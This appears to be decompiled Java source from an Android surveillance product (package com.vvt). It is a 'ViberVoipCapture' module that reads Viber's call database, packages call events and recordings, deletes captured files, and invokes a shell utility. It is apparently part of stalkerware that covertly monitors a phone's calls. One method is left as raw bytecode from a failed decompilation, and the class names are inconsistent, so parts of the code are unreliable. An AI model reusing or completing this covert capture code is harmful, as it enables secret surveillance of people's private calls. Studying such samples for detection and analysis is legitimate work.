package com.vvt.al.f;

import android.os.SystemClock;
import android.util.Pair;
import com.vvt.ag.b;
import java.io.File;

public class c
  extends com.vvt.al.a
  implements com.vvt.al.c
{
  private static final boolean c = com.vvt.ak.a.a;
  private static final boolean d = com.vvt.ak.a.e;
  
  public c(String paramString1, String paramString2, com.vvt.h.d paramd, com.vvt.base.a parama)
  {
    super(paramString1, paramString2, parama);
  }
  
  private com.vvt.im.events.info.d a(com.vvt.af.a.a parama)
  {
    boolean bool1 = c;
    if (bool1) {}
    Object localObject1 = c();
    String str1 = e();
    Object localObject2 = com.vvt.capture.viber.mode.a.d.a(this.a, (String)localObject1, str1);
    boolean bool2 = c;
    if (bool2) {}
    String str2 = com.vvt.capture.viber.mode.a.d.b(this.a, (String)localObject1, str1);
    boolean bool3 = c;
    if (bool3) {}
    String str3 = this.a;
    localObject1 = com.vvt.capture.viber.mode.a.d.c((String)localObject1, str1, str3);
    boolean bool4 = c;
    if (bool4) {}
    str1 = this.b;
    localObject1 = com.vvt.capture.viber.mode.full.c.a(str1, (String)localObject2, str2, (String)localObject1);
    bool4 = c;
    if (bool4) {}
    str1 = ((com.vvt.im.events.info.d)localObject1).g();
    boolean bool5 = b.a(str1);
    if (!bool5)
    {
      localObject2 = new java/io/File;
      ((File)localObject2).<init>(str1);
      ((File)localObject2).delete();
      bool4 = false;
      str1 = null;
      ((com.vvt.im.events.info.d)localObject1).f(null);
    }
    bool4 = c;
    if (bool4) {}
    return (com.vvt.im.events.info.d)localObject1;
  }
  
  /* Error */
  private void a(String paramString1, String paramString2)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: getstatic 16	com/vvt/al/f/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   5: istore 4
    //   7: iload 4
    //   9: ifeq +3 -> 12
    //   12: invokestatic 76	com/vvt/capture/viber/a/a/removeFromPath:a	()Ljava/lang/String;
    //   15: astore 5
    //   17: aload_2
    //   18: invokestatic 81	com/vvt/af/a/a:a	(Ljava/lang/String;)Lcom/vvt/af/a/a;
    //   21: astore 6
    //   23: aload 6
    //   25: ifnull +177 -> 202
    //   28: iconst_0
    //   29: istore 7
    //   31: aconst_null
    //   32: astore 8
    //   34: aload 6
    //   36: aload 5
    //   38: aconst_null
    //   39: invokevirtual 84	com/vvt/af/a/a:a	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   42: astore 8
    //   44: aload 8
    //   46: ifnull +327 -> 373
    //   49: aload 8
    //   51: aload 6
    //   53: invokestatic 87	com/vvt/capture/viber/a/a/removeFromPath:a	(Landroid/database/Cursor;Lcom/vvt/af/a/a;)Ljava/util/ArrayList;
    //   56: astore 5
    //   58: aload 5
    //   60: invokevirtual 93	java/util/ArrayList:size	()I
    //   63: istore 9
    //   65: iload 9
    //   67: ifle +116 -> 183
    //   70: iconst_0
    //   71: istore 9
    //   73: aload 5
    //   75: iconst_0
    //   76: invokevirtual 97	java/util/ArrayList:get	(I)Ljava/lang/Object;
    //   79: astore 5
    //   81: aload 5
    //   83: checkcast 99	com/vvt/capture/viber/a
    //   86: astore 5
    //   88: aload_0
    //   89: aload 6
    //   91: invokespecial 102	com/vvt/al/f/MyUncaughtExceptionHandler:a	(Lcom/vvt/af/a/a;)Lcom/vvt/im/events/info/d;
    //   94: astore 10
    //   96: aload 5
    //   98: astore_3
    //   99: aload 10
    //   101: astore 5
    //   103: aload 5
    //   105: astore 10
    //   107: aload_3
    //   108: astore 5
    //   110: aload 10
    //   112: astore_3
    //   113: aload 6
    //   115: ifnull +8 -> 123
    //   118: aload 6
    //   120: invokevirtual 105	com/vvt/af/a/a:a	()V
    //   123: aload 8
    //   125: ifnull +10 -> 135
    //   128: aload 8
    //   130: invokeinterface 110 1 0
    //   135: aload 5
    //   137: ifnull +35 -> 172
    //   140: aload_3
    //   141: ifnull +31 -> 172
    //   144: aload_0
    //   145: aload 5
    //   147: invokevirtual 113	com/vvt/al/f/MyUncaughtExceptionHandler:a	(Lcom/vvt/im/events/info/ICallLogData;)Z
    //   150: istore 7
    //   152: iload 7
    //   154: ifeq +154 -> 308
    //   157: getstatic 119	com/vvt/events/FxVoipCategory:VIBER	Lcom/vvt/events/FxVoipCategory;
    //   160: astore 8
    //   162: aload_0
    //   163: aload_1
    //   164: aload 5
    //   166: aload_3
    //   167: aload 8
    //   169: invokevirtual 122	com/vvt/al/f/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Lcom/vvt/im/events/info/ICallLogData;Lcom/vvt/im/events/info/d;Lcom/vvt/events/FxVoipCategory;)V
    //   172: getstatic 16	com/vvt/al/f/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   175: istore 4
    //   177: iload 4
    //   179: ifeq +3 -> 182
    //   182: return
    //   183: getstatic 21	com/vvt/al/f/MyUncaughtExceptionHandler:d	Z
    //   186: istore 4
    //   188: iload 4
    //   190: ifeq +3 -> 193
    //   193: iconst_0
    //   194: istore 4
    //   196: aconst_null
    //   197: astore 5
    //   199: goto -96 -> 103
    //   202: getstatic 21	com/vvt/al/f/MyUncaughtExceptionHandler:d	Z
    //   205: istore 4
    //   207: iload 4
    //   209: ifeq +3 -> 212
    //   212: iconst_0
    //   213: istore 4
    //   215: aconst_null
    //   216: astore 5
    //   218: iconst_0
    //   219: istore 7
    //   221: aconst_null
    //   222: astore 8
    //   224: goto -111 -> 113
    //   227: astore 5
    //   229: iconst_0
    //   230: istore 4
    //   232: aconst_null
    //   233: astore 5
    //   235: iconst_0
    //   236: istore 7
    //   238: aconst_null
    //   239: astore 8
    //   241: aconst_null
    //   242: astore 6
    //   244: getstatic 21	com/vvt/al/f/MyUncaughtExceptionHandler:d	Z
    //   247: istore 9
    //   249: iload 9
    //   251: ifeq +3 -> 254
    //   254: aload 6
    //   256: ifnull +8 -> 264
    //   259: aload 6
    //   261: invokevirtual 105	com/vvt/af/a/a:a	()V
    //   264: aload 8
    //   266: ifnull -131 -> 135
    //   269: goto -141 -> 128
    //   272: astore 5
    //   274: iconst_0
    //   275: istore 7
    //   277: aconst_null
    //   278: astore 8
    //   280: aconst_null
    //   281: astore 6
    //   283: aload 6
    //   285: ifnull +8 -> 293
    //   288: aload 6
    //   290: invokevirtual 105	com/vvt/af/a/a:a	()V
    //   293: aload 8
    //   295: ifnull +10 -> 305
    //   298: aload 8
    //   300: invokeinterface 110 1 0
    //   305: aload 5
    //   307: athrow
    //   308: getstatic 16	com/vvt/al/f/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   311: istore 4
    //   313: iload 4
    //   315: ifeq +3 -> 318
    //   318: aload_1
    //   319: invokestatic 127	com/vvt/shell/ShellUtil:i	(Ljava/lang/String;)V
    //   322: goto -150 -> 172
    //   325: astore 5
    //   327: iconst_0
    //   328: istore 7
    //   330: aconst_null
    //   331: astore 8
    //   333: goto -50 -> 283
    //   336: astore 5
    //   338: goto -55 -> 283
    //   341: astore 5
    //   343: iconst_0
    //   344: istore 4
    //   346: aconst_null
    //   347: astore 5
    //   349: iconst_0
    //   350: istore 7
    //   352: aconst_null
    //   353: astore 8
    //   355: goto -111 -> 244
    //   358: astore 5
    //   360: iconst_0
    //   361: istore 4
    //   363: aconst_null
    //   364: astore 5
    //   366: goto -122 -> 244
    //   369: pop
    //   370: goto -126 -> 244
    //   373: iconst_0
    //   374: istore 4
    //   376: aconst_null
    //   377: astore 5
    //   379: goto -266 -> 113
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	382	0	this	MyUncaughtExceptionHandler
    //   0	382	1	paramString1	String
    //   0	382	2	paramString2	String
    //   1	166	3	localObject1	Object
    //   5	370	4	bool1	boolean
    //   15	202	5	localObject2	Object
    //   227	1	5	localException1	Exception
    //   233	1	5	localObject3	Object
    //   272	34	5	localObject4	Object
    //   325	1	5	localObject5	Object
    //   336	1	5	localObject6	Object
    //   341	1	5	localException2	Exception
    //   347	1	5	localObject7	Object
    //   358	1	5	localException3	Exception
    //   364	14	5	localObject8	Object
    //   21	268	6	locala	com.vvt.af.a.a
    //   29	322	7	bool2	boolean
    //   32	322	8	localObject9	Object
    //   63	9	9	i	int
    //   247	3	9	bool3	boolean
    //   94	17	10	localObject10	Object
    //   369	1	21	localException4	Exception
    // Exception table:
    //   from	to	target	type
    //   17	21	227	java/lang/Exception
    //   17	21	272	finally
    //   38	42	325	finally
    //   202	205	325	finally
    //   51	56	336	finally
    //   58	63	336	finally
    //   75	79	336	finally
    //   81	86	336	finally
    //   89	94	336	finally
    //   183	186	336	finally
    //   244	247	336	finally
    //   38	42	341	java/lang/Exception
    //   202	205	341	java/lang/Exception
    //   51	56	358	java/lang/Exception
    //   58	63	358	java/lang/Exception
    //   75	79	358	java/lang/Exception
    //   81	86	358	java/lang/Exception
    //   183	186	358	java/lang/Exception
    //   89	94	369	java/lang/Exception
  }
  
  private Pair f()
  {
    Object localObject1 = com.vvt.capture.viber.mode.a.a.a();
    Object localObject2 = c();
    String str1 = e();
    boolean bool1 = b.a((String)localObject1);
    boolean bool2;
    if (!bool1)
    {
      String str2 = this.a;
      localObject1 = com.vvt.capture.viber.mode.a.d.a((String)localObject1, (String)localObject2, str1, str2);
      bool2 = b.a((String)localObject1);
      if (bool2) {
        break label88;
      }
      bool2 = c;
      if (bool2) {}
      bool2 = true;
      localObject2 = Boolean.valueOf(bool2);
    }
    for (localObject1 = Pair.create(localObject2, localObject1);; localObject1 = Pair.create(localObject1, null))
    {
      return (Pair)localObject1;
      boolean bool3 = d;
      if (bool3) {}
      label88:
      bool3 = false;
      localObject1 = Boolean.valueOf(false);
      bool2 = false;
      localObject2 = null;
    }
  }
  
  public String a()
  {
    return "voip_vb";
  }
  
  public void a(String paramString, long paramLong)
  {
    boolean bool = c;
    if (bool) {}
    bool = c;
    if (bool) {}
    long l = 10000L;
    SystemClock.sleep(l);
    Pair localPair = f();
    Object localObject = (Boolean)localPair.first;
    bool = ((Boolean)localObject).booleanValue();
    if (bool)
    {
      localObject = (String)localPair.second;
      a(paramString, (String)localObject);
    }
    d();
    bool = c;
    if (bool) {}
  }
  
  public String b()
  {
    return "ViberVoipCapture";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/f/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */